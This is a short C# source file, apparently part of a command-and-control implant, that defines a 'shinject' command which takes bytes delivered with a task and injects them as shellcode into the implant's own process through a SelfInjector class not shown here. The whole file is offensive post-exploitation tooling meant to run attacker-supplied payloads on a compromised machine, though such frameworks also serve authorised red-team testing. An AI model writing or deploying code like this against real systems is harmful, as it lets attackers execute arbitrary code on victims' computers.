using Agent.Internal;
using Agent.Models;

namespace Agent.Commands
{
    public class ShellCodeInject : AgentCommand
    {
        public override string Name => "shinject";

        public override string Execute(AgentTask task)
        {
            var injector = new SelfInjector();
            var success = injector.Inject(task.FileBytes);

            if (success)
            {
                return "Shellcode injected";
            }
            else
                return "Failed to inject shellcode";
        }
    }
}
